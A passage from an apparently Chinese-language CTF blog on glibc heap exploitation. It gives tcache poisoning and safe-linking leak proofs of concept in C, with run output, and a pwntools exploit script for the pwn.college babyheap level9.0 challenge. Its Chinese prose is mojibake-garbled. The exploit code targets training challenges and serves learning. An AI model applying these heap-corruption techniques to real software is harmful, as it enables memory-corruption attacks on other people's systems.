<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è€ƒè™‘ä¿®æ”¹<code>chunk2.next</code> æŒ‡å‘<code>fake_chunk</code></p>
<p>ä¿®æ”¹å®Œä¹‹å<code>tcache</code>çš„çŠ¶æ€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>è¿™ç§çŠ¶æ€<strong>å¯ä»¥çœ‹ä½œ</strong><code>tcache</code>ä»<strong>ç©º</strong>åˆ°å…ˆ<code>free(fake_chunk)</code>ç„¶å<code>free(chunk2)</code>ä¹‹åçš„çŠ¶æ€,è¯šå¦‚æ˜¯,å¯ä»¥ä»å¤´å¼€å§‹è€ƒè™‘:</p>
<p>åœ¨<code>free(fake_chunk)</code>ä¹‹å,<code>tcache</code>ä¸­çš„çŠ¶æ€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>

<p>åˆ<code>chunk2_mem &gt;&gt; 12</code>å°±æ˜¯<code>chunk2</code>çš„è™šæ‹Ÿé¡µæ¡†å·,å…¶å€¼ç­‰äº<code>chunk1.next</code>,å› æ­¤å¯ä»¥åœ¨<code>fake_chunk</code>ä¸Šé“¾å‰,å…ˆè®¡ç®—å¾—çŸ¥è¯¥å€¼</p>
<p>åˆ<code>fake_chunk_mem</code>æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ç›®æ ‡åœ°å€,</p>
<p>å› æ­¤<code>chunk2.next</code>è®¡ç®—å¯å¾—</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//ç»“æ„ä½“è‡ªåŠ¨å¯¹é½åˆ°sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>



<h5 id="safe-linking-metadata-poisoning-memory-leak"><a href="#safe-linking-metadata-poisoning-memory-leak" class="headerlink" title="[safe-linking] metadata poisoning memory leak"></a>[safe-linking] metadata poisoning memory leak</h5><p>ä½¿ç”¨<code>tcache entry poisoning</code>ä¹‹åä¸€ç›´<code>malloc</code>æŠŠå‡å †å—æ‹¿å‡ºæ¥</p>
<p>æ­¤æ—¶<code>fake_chunk.next</code>å€¼ä¼šè¢«â€œè§£å¯†â€ç„¶åæŒ‚è½½<code>tcache.entries[idx]</code></p>
<p>å…·ä½“è¿‡ç¨‹æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>å½“<code>fake_chunk</code>è¦ä»é“¾æ¡ä¸Šæ‹¿èµ°æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//epå°±æ˜¯æ¡¶å­å¤´</span><br><span class="line">e = *ep				//e å°±æ˜¯fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//æ–°epæŒ‡å‘</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æƒ³è¦æ³„éœ²çš„æ˜¯<code>fake_chunk.next</code>,</p>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“çš„æ˜¯<code>fake_chunk_addr</code></p>
<p>è¿˜éœ€è¦çŸ¥é“ä¸€ä¸ª<code>tcache-&gt;entries[tc_idx]</code></p>
<p>æ¥ä¸‹æ¥å†é‡Šæ”¾ä¸€ä¸ªå †å—<code>chunk0</code>è¿›å…¥<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>

<p>å› æ­¤æœ€ç»ˆå¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>



<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">â””â”€# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">â””â”€# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>



<p>æ³¨æ„glibc2.35ä¹‹åå †å—çš„å¯¹é½è¦æ±‚, å †å—çš„åœ°å€å¿…é¡»æ˜¯0x10å¯¹é½çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯glibc2.31åŠä¹‹å‰æ˜¯å¯ä»¥å¯¹é½åˆ°0x8çš„</p>
<h3 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc-2.35"></a>glibc-2.35</h3><p>ubuntu22.04ä¸Šä½¿ç”¨glibc-2.35,å…¶æ•°æ®ç»“æ„ä¸ç®—æ³•åŸºæœ¬ä¸Šå’Œglibc2.38ç›¸</p>
<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><table>
<thead>
<tr>
<th>ubuntuå‘è¡Œç‰ˆ</th>
<th>glibcç‰ˆæœ¬</th>
<th>è°ƒè¯•å·¥å…·</th>
</tr>
</thead>
<tbody><tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody></table>
<blockquote>
<p>pwndbg for ubuntu18.04çš„å®‰è£…æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>pwndbg for ubuntu20.04çš„å®‰è£…æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1-UAF"><a href="#level1-UAF" class="headerlink" title="level1 - UAF"></a>level1 - UAF</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2 -"></a>level2 -</h3><h3 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h3><p><code>secret </code>ä½äº <code>0x427C72</code></p>
<p>ç„¶è€Œ<code>malloc</code>æ£€æŸ¥åœ°å€å¿…é¡»åœ¨<code>0x430000</code>ä¹‹ä¸Š</p>
<p>å¦‚æ­¤ä¸€æ¥, <strong>é€šè¿‡<code>UAF tcache poisoning</code>æŠŠ<code>0x427C72</code>ä½œä¸ºå‡å †å—æŒ‚åˆ°<code>tcache</code>ä¸­, ç„¶å<code>malloc</code>æ‹¿å‡ºæ¥æ‰“å°å…¶å†…å®¹</strong>çš„æ€è·¯å°±å¤±æ•ˆäº†, å› ä¸º<code>malloc </code>ä¸è®©æˆ‘ä»¬æ‹¿å‡ºè¿™ä¸ªå‡å †å—æ¥</p>
<p>è™½ç„¶æˆ‘ä»¬æ‹¿ä¸å‡ºå‡å †å—æ¥,ä½†æ˜¯æŠ•æ¯’ä¼šä¼ æŸ“ç»™å…ƒæ•°æ®</p>
<p><strong>å…·ä½“æ¥è¯´:</strong></p>
<p>1.é€šè¿‡<code>UAF</code>å¯¹<code>tcache</code>ä¸­çš„çœŸå †å—æŠ•æ¯’,ä½¿å¾— <strong>å‡å †å—@0x427C72</strong> è¿›å…¥<code>tcache</code></p>
<p>2.<code>malloc </code>æ‹¿å‡ºçœŸå †å—</p>
<p>3.<code>malloc </code>æ‹¿å‡ºå‡å †å—, </p>
<p>æ­¤æ—¶å‡å †å—çš„<code>next</code>å€¼,å°±æ˜¯<code>secret[0-7]</code></p>
<p>æ­¤æ—¶å‡å †å—çš„<code>key</code>å€¼,å°±æ˜¯<code>secret[8-15]</code></p>
<p><code>tcache</code>å…ƒæ•°æ®ä¼šç»§æ‰¿ <strong>å‡å †å—.next</strong>,</p>
<p>å¹¶ä¸”å‡å †å—åœ¨è¢«é‡æ–°åˆ†é…æ—¶,<code>key</code>å€¼ä¼šè¢«ç½®é›¶,ä¹Ÿå°±æ˜¯è¯´<code>secret[8-15] = 0</code></p>
<p>4.é‡å¤ä¸Šè¿°æ­¥éª¤,ä½†æ˜¯è¿™æ¬¡<strong>å‡å †å—@0x427C72 - 8</strong></p>
<p>å¦‚æ­¤<code>secret[0-7]</code>ä¹Ÿä¼šè¢«ç½®0</p>
<p>å¦‚æ­¤ä¸€æ¥,æˆ‘ä»¬æ ¹æœ¬ä¸éœ€è¦çŸ¥é“<code>secret</code>æ˜¯å¤šå°‘,ç›´æ¥æ”¾é›¶è›‹</p>
<blockquote>
<p>glibc2.31ä¸­,tcacheçš„å †å—ä¸ä¼šæœ‰å¯¹é½è¦æ±‚</p>
<p>åŒæ ·çš„æ€è·¯åœ¨glibc2.35ä¸Šå°±æ›´åŠ å›°éš¾äº†,ä¸€ä¸ªæ˜¯æœ‰safe-linking ,äºŒä¸ªæ˜¯tcacheå †å—å¿…é¡»å¯¹é½åˆ°0x10</p>
<p>glibc2.35ä¸­å¯ä»¥æ³„éœ²ä½8å­—èŠ‚,å½’é›¶é«˜8å­—èŠ‚</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>



<h3 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h3><p>ç¨‹åºä¸­æœ‰ä¸€ä¸ª<code>win</code>å‡½æ•°ï¼Œå¯ä»¥<code>ret2text</code></p>
<p>ä½†æ˜¯ç¨‹åºå¼€å¯äº†<code>pie</code>ä¿æŠ¤ï¼Œå› æ­¤éœ€è¦å…ˆæ³„éœ²<code>pie base</code></p>
<p>å…è®¸å †æ ˆä¸Šæº¢å‡ºæ„é€ å‡å †å—ï¼Œå¹¶<code>free</code>è¿›å…¥<code>tcache</code>, </p>
<p>ç”±äºæ ˆä¸Šæœ‰<code>canary</code>å¹¶ä¸”æº¢å‡ºé•¿åº¦æœ‰é™, å› æ­¤éœ€è¦åˆ©ç”¨å‡å †å—è¿›è¡Œæ³„éœ²æˆ–è€…ç¯¡æ”¹è¿”å›åœ°å€</p>
<blockquote>
<p>bufferè§†è§’:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td>ä½</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>&#x3D;&#x3D;buffer_end&#x3D;&#x3D;</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>é«˜</td>
</tr>
</tbody></table>
